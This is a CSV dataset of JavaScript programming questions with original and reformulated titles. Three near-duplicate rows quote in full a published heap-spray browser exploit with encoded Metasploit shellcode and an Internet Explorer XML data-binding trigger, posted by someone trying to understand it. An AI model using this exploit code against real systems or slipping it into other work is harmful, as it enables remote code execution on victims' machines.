originalTitle,body,reformulatedTitle
Professional jQuery based Combox control?," Are there any professional Combobox controls (dropdown list with autosuggestion) based on the jQuery library?It should be able to handle large datasets and have some skinning options. A multi-column result list would be great too. I'm working with ASP.NET, but it's a not a problem if I had to write a wrapper for it.I'm already using a third-party control, but I ran into some compatibilty issues between two vendor's controls. Well, I want to get rid of this kind of dependencies. <code> ",Professional jQuery based Combobox control?
Where to place Javascript in a HTML file?," Say I have a fairly hefty JavaScript file, packed down to roughly 100kb or so. By file I mean its an external file that would be linked in via <script src=""..."">, not pasted into the HTML itself.Wheres the best place to put this in the HTML? Will there be any functional difference between each of the options? <code>  <html><head> <!-- here? --> <link rel=""stylesheet"" href=""stylez.css"" type=""text/css"" /> <!-- here? --></head><body> <!-- here? --> <p>All the page content ...</p> <!-- or here? --></body></html>",Where to place JavaScript in an HTML file?
How do I change the background color with AJAX?, Anyone know a simple method to swap the background color of a webpage using JavaScript? <code> ,How do I change the background color with JavaScript?
How do I change the background color with Javascript?, Anyone know a simple method to swap the background color of a webpage using JavaScript? <code> ,How do I change the background color with JavaScript?
How to manage a redirect request after a JQuery Ajax call," I'm using $.post() to call a servlet using Ajax and then using the resulting HTML fragment to replace a div element in the user's current page. However, if the session times out, the server sends a redirect directive to send the user to the login page. In this case, jQuery is replacing the div element with the contents of the login page, forcing the user's eyes to witness a rare scene indeed. How can I manage a redirect directive from an Ajax call with jQuery 1.2.6? <code> ",How to manage a redirect request after a jQuery Ajax call
Tracking and debugging JS memory leaks in Firefox.," I've been trying to track this one for literally a month now without any success. I have this piece of code on an car advertising website which basically allows thumbnails to rotate in search results given that a car has multiple pictures. You can see it in action at the following: http://www.abcavendre.com/4506691919/It is built on the mootools 1.2 framework. The problem is that this script, under Firefox 3, consumes a rather large amount of memory overtime when a page is full of those rotating pictures, such as this inventory page: http://www.abcavendre.com/Vitrine/Israel_Huttman/You can see the source of the script in question here: http://www.abcavendre.com/scripts/showcase_small.jsAny ideas as to what is causing the memory leak? The weird thing is this code behaves properly under IE7. <code> ",How do I track and debug JavaScript memory leaks in Firefox?
Destructuring assignment in Javascript," As can be seen in the Mozilla changlog for JavaScript 1.7 they have added destructuring assignment. Sadly I'm not very fond of the syntax (why write a and b twice?): Something like this would have been a lot better: That would still be backwards compatible. Python-like destructuring would not be backwards compatible.Anyway the best solution for JavaScript 1.5 that I have been able to come up with is: Which works like: But this really sucks because _ has no meaning. It's just an empty shell to store the names. But sadly it's needed because JavaScript doesn't have pointers. On the plus side you can assign default values in the case the values are not matched. Also note that this solution doesn't try to slice the array. So you can't do something like {first: 0, rest: 0}. But that could easily be done, if one wanted that behavior.What is a better solution? <code>  var a, b; [a, b] = f(); var [a, b] = f(); function assign(array, map) { var o = Object(); var i = 0; $.each(map, function(e, _) { o[e] = array[i++]; }); return o;} var array = [1,2];var _ = assign[array, { var1: null, var2: null });_.var1; // prints 1_.var2; // prints 2",Destructuring assignment in JavaScript
Why would a javascript variable start with a dollar sign?," I quite often see JavaScript with variables that start with a dollar sign. When/why would you choose to prefix a variable in this way?(I'm not asking about $('p.foo') syntax that you see in jQuery and others, but normal variables like $name and $order) <code> ",Why would a JavaScript variable start with a dollar sign?
Printing to a specific printer from a web app," If I have a printer hooked directly to a pc (a kiosk with a printer), how would I go about creating the ability for a web page (.net web app) to print a jpg to the kiosks printer with no user intervention other than clicking a button on the page? <code> ",Printing to a client printer from a web app
JavaScript coding standard, What are the established coding standards for JavaScript? <code> ,Are there any coding standards for JavaScript?
"Is it possible to read the clipboard in firefox, safari and chrome using javascript?"," I'm trying to read the contents of the clipboard using JavaScript. With Internet Explorer it's possible using the function Is there a similar way of reading the clipboard in Firefox, Safari and Chrome? <code>  window.clipboardData.getData(""Text"")","Is it possible to read the clipboard in Firefox, Safari and Chrome using JavaScript?"
"Is it possible to read the clipboard in Firefox, Safari and Chrome using Javascript?"," I'm trying to read the contents of the clipboard using JavaScript. With Internet Explorer it's possible using the function Is there a similar way of reading the clipboard in Firefox, Safari and Chrome? <code>  window.clipboardData.getData(""Text"")","Is it possible to read the clipboard in Firefox, Safari and Chrome using JavaScript?"
Is there a Internet Explorer approved substitute for selectionStart and selectionEnd?," Finding out what's selected in real browsers is as simple as: But IE, as usual, doesn't understand. What's the best cross-browser way to do this? <code>  var range = { start: textbox.selectionStart, end: textbox.selectionEnd}",Is there an Internet Explorer approved substitute for selectionStart and selectionEnd?
[Javascript] How to combine setInterval and setTimeout?," I am trying to call a setTimeout from within a setInterval callback: setInterval works as expected but setTimeout call is failing. I guess the problem is related to the fact that I am referencing a variable (myVar) that's not in scope.What's the best way to solve this? <code>  function callback(){ //assign myVar var myVar = document.getElementById(""givenID""); //... //now wait 2 secs then call some code that uses myVAr setTimeout(""myVar.innerHTML = 'TEST'"", 2000);}setInterval(""callback();"", 10000);",How to solve Var out of scope within setTimeout call
[Javascript] How to solve Var out of scope within setTimeout call," I am trying to call a setTimeout from within a setInterval callback: setInterval works as expected but setTimeout call is failing. I guess the problem is related to the fact that I am referencing a variable (myVar) that's not in scope.What's the best way to solve this? <code>  function callback(){ //assign myVar var myVar = document.getElementById(""givenID""); //... //now wait 2 secs then call some code that uses myVAr setTimeout(""myVar.innerHTML = 'TEST'"", 2000);}setInterval(""callback();"", 10000);",How to solve Var out of scope within setTimeout call
How do I round a number in javascript?," While working on a project, I came across a JS-script created by a former employee that basically creates a report in the form of etc.The peoblem is that the values can sometimes be floats (with different precision), integers, or even in the form 2.20011E+17. What I want to output are pure integers. I don't know a lot of JavaScript, though. How would I go about writing a method that takes these sometimes-floats and makes them integers? <code>  Name : ValueName2 : Value2",How do I round a number in JavaScript?
count immediate child elements using Query," I have the following HTML node structure: How do I count the number of immediate children of foo, that are of type div? In the example above, the result should be two (bar and baz). <code>  <div id=""foo""> <div id=""bar""></div> <div id=""baz""> <div id=""biz""></div> </div> <span></span></div>",Count immediate child div elements using jQuery
count immediate child div elements using Query," I have the following HTML node structure: How do I count the number of immediate children of foo, that are of type div? In the example above, the result should be two (bar and baz). <code>  <div id=""foo""> <div id=""bar""></div> <div id=""baz""> <div id=""biz""></div> </div> <span></span></div>",Count immediate child div elements using jQuery
count immediate child div elements using jQuery," I have the following HTML node structure: How do I count the number of immediate children of foo, that are of type div? In the example above, the result should be two (bar and baz). <code>  <div id=""foo""> <div id=""bar""></div> <div id=""baz""> <div id=""biz""></div> </div> <span></span></div>",Count immediate child div elements using jQuery
Changing website favicon dynamically," I have a web application that's branded according to the user that's currently logged in. I'd like to change the favicon of the page to be the logo of the private label, but I'm unable to find any code or any examples of how to do this. Has anybody successfully done this before?I'm picturing having a dozen icons in a folder, and the reference to which favicon.ico file to use is just generated dynamically along with the HTML page. Thoughts? <code> ",How to change the website favicon dynamically
How to get cursor position in textarea?," How do you get the caret position in a <textarea> using JavaScript?For example: This is| a textThis should return 7.How would you get it to return the strings surrounding the cursor / selection?E.g.: 'This is', '', ' a text'.If the word is is highlighted, then it would return 'This ', 'is', ' a text'. <code> ","How to get the caret column (not pixels) position in a textarea, in characters, from the start?"
How to get caret position in textarea?," How do you get the caret position in a <textarea> using JavaScript?For example: This is| a textThis should return 7.How would you get it to return the strings surrounding the cursor / selection?E.g.: 'This is', '', ' a text'.If the word is is highlighted, then it would return 'This ', 'is', ' a text'. <code> ","How to get the caret column (not pixels) position in a textarea, in characters, from the start?"
"Caret position in textarea, in characters from the start"," How do you get the caret position in a <textarea> using JavaScript?For example: This is| a textThis should return 7.How would you get it to return the strings surrounding the cursor / selection?E.g.: 'This is', '', ' a text'.If the word is is highlighted, then it would return 'This ', 'is', ' a text'. <code> ","How to get the caret column (not pixels) position in a textarea, in characters, from the start?"
"How to get the caret position in a textarea, in characters, from the start?"," How do you get the caret position in a <textarea> using JavaScript?For example: This is| a textThis should return 7.How would you get it to return the strings surrounding the cursor / selection?E.g.: 'This is', '', ' a text'.If the word is is highlighted, then it would return 'This ', 'is', ' a text'. <code> ","How to get the caret column (not pixels) position in a textarea, in characters, from the start?"
"Javascript Prototype- click, mouseover and mouseout can't work together?"," I'm trying to do a very simple button that changes color based on mouseover, mouseout andclick, I'm doing this in prototype and the weird thing is if I used mouseover and mouseout,after I clicked on the button, the button wouldn't change to white, seems like it is because of the mouseout, here's my code how can I fix it? Thanks. <code>  $(""izzy"").observe('mouseover', function() { $('izzy').setStyle({ color: '#FFFFFF' });});$(""izzy"").observe('mouseout', function() { $('izzy').setStyle({ color: '#666666' });});$(""izzy"").observe('click', function() { $('izzy').setStyle({ color: '#FFFFFF' });});","Prototype click, mouseover and mouseout can't work together?"
jQuery - How to Select Multiple Descendants?," I have this form: How can I select the input and select with one jQuery selector?I tried this but it selected all of the selects and inputs on the page: <code>  <form name=""customize""> Only show results within <select name=""distance"" id=""slct_distance""> <option>25</option> <option>50</option> <option>100</option> <option value=""10000"" selected=""selected"">Any</option> </select> miles of zip code <input type=""text"" class=""text"" name=""zip_code"" id=""txt_zip_code"" /> <span id=""customize_validation_msg""></span></form> $(""form[name='customize'] select,input"")",Select multiple descendants with jQuery?
Google Chrome - javascript version," Which version of JavaScript does Google Chrome support in relation to Mozilla Firefox? In other words, does Chrome support JavaScript 1.6, 1.7, or 1.8 which Firefox also supports or some combination of them? <code> ",Google Chrome - JavaScript version
Difference between postback and callback , I keep on hearing this words 'callback' and 'postback' tossed around.What is the difference between two ? Is postback very specific to the ASP.NET pages ? <code> ,Difference between a Postback and a Callback 
Help me understand this few JavaScript line," I usually do not have difficulty to read JavaScript code but for this one I cant figure out the logic. The code is from an exploit that has been published 4 days ago. You can find it at milw0rm.Here is the code: Here is what I believe it does and I would like you to help me for the part that I misunderstand.The variable shellcode contains the code to open the calc.exe. I do not get how they have found that weird string. Any idea?The second thing is the variable spray. I do not understand this weird loop.The third thing is the variable memory that is never used anywhere. Why do they create it?Last thing: what does the XML tag do in the page?For the moment I have good answers but mostly very general ones. I would like more explanations of the value of the code. An example is unescape(""%u0a0a%u0a0a"");. What does it mean? Same thing for the loop: why did the developer write: length < 0xd0000? I would like a deeper understanding, not only the theory of this code. <code>  <html> <div id=""replace"">x</div> <script> // windows/exec - 148 bytes // http://www.metasploit.com // Encoder: x86/shikata_ga_nai // EXITFUNC=process, CMD=calc.exe var shellcode = unescape(""%uc92b%u1fb1%u0cbd%uc536%udb9b%ud9c5%u2474%u5af4%uea83%u31fc%u0b6a%u6a03%ud407%u6730%u5cff%u98bb%ud7ff%ua4fe%u9b74%uad05%u8b8b%u028d%ud893%ubccd%u35a2%u37b8%u4290%ua63a%u94e9%u9aa4%ud58d%ue5a3%u1f4c%ueb46%u4b8c%ud0ad%ua844%u524a%u3b81%ub80d%ud748%u4bd4%u6c46%u1392%u734a%u204f%uf86e%udc8e%ua207%u26b4%u04d4%ud084%uecba%u9782%u217c%ue8c0%uca8c%uf4a6%u4721%u0d2e%ua0b0%ucd2c%u00a8%ub05b%u43f4%u24e8%u7a9c%ubb85%u7dcb%ua07d%ued92%u09e1%u9631%u5580""); // ugly heap spray, the d0nkey way! // works most of the time var spray = unescape(""%u0a0a%u0a0a""); do { spray += spray; } while(spray.length < 0xd0000); memory = new Array(); for(i = 0; i < 100; i++) memory[i] = spray + shellcode; xmlcode = ""<XML ID=I><X><C><![CDATA[<image SRC=http://&#x0a0a;&#x0a0a;.example.com>]]></C></X></XML><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML><XML ID=I></XML><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN></SPAN>""; tag = document.getElementById(""replace""); tag.innerHTML = xmlcode; </script></html>",How does this milw0rm heap spraying exploit work?
Help me understand this JavaScript exploit.," I usually do not have difficulty to read JavaScript code but for this one I cant figure out the logic. The code is from an exploit that has been published 4 days ago. You can find it at milw0rm.Here is the code: Here is what I believe it does and I would like you to help me for the part that I misunderstand.The variable shellcode contains the code to open the calc.exe. I do not get how they have found that weird string. Any idea?The second thing is the variable spray. I do not understand this weird loop.The third thing is the variable memory that is never used anywhere. Why do they create it?Last thing: what does the XML tag do in the page?For the moment I have good answers but mostly very general ones. I would like more explanations of the value of the code. An example is unescape(""%u0a0a%u0a0a"");. What does it mean? Same thing for the loop: why did the developer write: length < 0xd0000? I would like a deeper understanding, not only the theory of this code. <code>  <html> <div id=""replace"">x</div> <script> // windows/exec - 148 bytes // http://www.metasploit.com // Encoder: x86/shikata_ga_nai // EXITFUNC=process, CMD=calc.exe var shellcode = unescape(""%uc92b%u1fb1%u0cbd%uc536%udb9b%ud9c5%u2474%u5af4%uea83%u31fc%u0b6a%u6a03%ud407%u6730%u5cff%u98bb%ud7ff%ua4fe%u9b74%uad05%u8b8b%u028d%ud893%ubccd%u35a2%u37b8%u4290%ua63a%u94e9%u9aa4%ud58d%ue5a3%u1f4c%ueb46%u4b8c%ud0ad%ua844%u524a%u3b81%ub80d%ud748%u4bd4%u6c46%u1392%u734a%u204f%uf86e%udc8e%ua207%u26b4%u04d4%ud084%uecba%u9782%u217c%ue8c0%uca8c%uf4a6%u4721%u0d2e%ua0b0%ucd2c%u00a8%ub05b%u43f4%u24e8%u7a9c%ubb85%u7dcb%ua07d%ued92%u09e1%u9631%u5580""); // ugly heap spray, the d0nkey way! // works most of the time var spray = unescape(""%u0a0a%u0a0a""); do { spray += spray; } while(spray.length < 0xd0000); memory = new Array(); for(i = 0; i < 100; i++) memory[i] = spray + shellcode; xmlcode = ""<XML ID=I><X><C><![CDATA[<image SRC=http://&#x0a0a;&#x0a0a;.example.com>]]></C></X></XML><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML><XML ID=I></XML><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN></SPAN>""; tag = document.getElementById(""replace""); tag.innerHTML = xmlcode; </script></html>",How does this milw0rm heap spraying exploit work?
Help me understand this few JavaScript line," I usually do not have difficulty to read JavaScript code but for this one I cant figure out the logic. The code is from an exploit that has been published 4 days ago. You can find it at milw0rm.Here is the code: Here is what I believe it does and I would like you to help me for the part that I misunderstand.The variable shellcode contains the code to open the calc.exe. I do not get how they have found that weird string. Any idea?The second thing is the variable spray. I do not understand this weird loop.The third thing is the variable memory that is never used anywhere. Why do they create it?Last thing: what does the XML tag do in the page?For the moment I have good answers but mostly very general ones. I would like more explanations of the value of the code. An example is unescape(""%u0a0a%u0a0a"");. What does it mean? Same thing for the loop: why did the developer write: length < 0xd0000? I would like a deeper understanding, not only the theory of this code. <code>  <html> <div id=""replace"">x</div> <script> // windows/exec - 148 bytes // http://www.metasploit.com // Encoder: x86/shikata_ga_nai // EXITFUNC=process, CMD=calc.exe var shellcode = unescape(""%uc92b%u1fb1%u0cbd%uc536%udb9b%ud9c5%u2474%u5af4%uea83%u31fc%u0b6a%u6a03%ud407%u6730%u5cff%u98bb%ud7ff%ua4fe%u9b74%uad05%u8b8b%u028d%ud893%ubccd%u35a2%u37b8%u4290%ua63a%u94e9%u9aa4%ud58d%ue5a3%u1f4c%ueb46%u4b8c%ud0ad%ua844%u524a%u3b81%ub80d%ud748%u4bd4%u6c46%u1392%u734a%u204f%uf86e%udc8e%ua207%u26b4%u04d4%ud084%uecba%u9782%u217c%ue8c0%uca8c%uf4a6%u4721%u0d2e%ua0b0%ucd2c%u00a8%ub05b%u43f4%u24e8%u7a9c%ubb85%u7dcb%ua07d%ued92%u09e1%u9631%u5580""); // ugly heap spray, the d0nkey way! // works most of the time var spray = unescape(""%u0a0a%u0a0a""); do { spray += spray; } while(spray.length < 0xd0000); memory = new Array(); for(i = 0; i < 100; i++) memory[i] = spray + shellcode; xmlcode = ""<XML ID=I><X><C><![CDATA[<image SRC=http://&#x0a0a;&#x0a0a;.example.com>]]></C></X></XML><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML><XML ID=I></XML><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN></SPAN>""; tag = document.getElementById(""replace""); tag.innerHTML = xmlcode; </script></html>",How does this milw0rm heap spraying exploit work?
Debugging javascript in safari for windows, Is there a way to debug javascript using Safari 3.2 in Windows Vista? I found a link to a debugger named Drosera but I can't get it to work because the information seams to be outdated.  <code> ,Debugging javascript in Safari for Windows
downscale jquery or prototype - JS framework selection," While considering the JS framework for my next project, I can see the scale clearly tipping towards jQuery, however, Prototype is getting good reviews, too.The issue I am thinking of is how to downscale these to have only the functionality I REALLY need. The latest jQuery seems to be 55k compressed, for instance, and I clearly need only the very basic functionality needed mostly or cross-browser compatibility.The alternative of coding just what I need by hand sounds quite a pain in the butt.Has anyone come across some ""jQuery downscaler"" or ""Prototype downscaler""? Stuff like Dlite does not quite cut it since I need the cross-browser AJAX with timeouts, and the cross-browser cookie handling, but maybe there is some other lightweight solution?ASP-related bundles won't help since I am doing a PHP-based solution.Any tips on that will be much appreciated. <code> ",Downscaled versions of jQuery or Prototype - JS framework selection
What the best pratices to place ads in a website?," I want place ads in my website, but I'm unsure about the common practices to place thes ads.By example, some cool asp.net articles sites shows ads in the middle of the article! So you read 2-3 paragraphs, read some ad, then finish the article reading...Another worry is about sabotage. One of mine customers get their Google adsense account banned, due some rival that clicked a lot of times in the goodle ads... there is some javascript techniques to block [edit] the undesirable click flood! [/edit]? <code> ",What the best practices to place ads in a website?
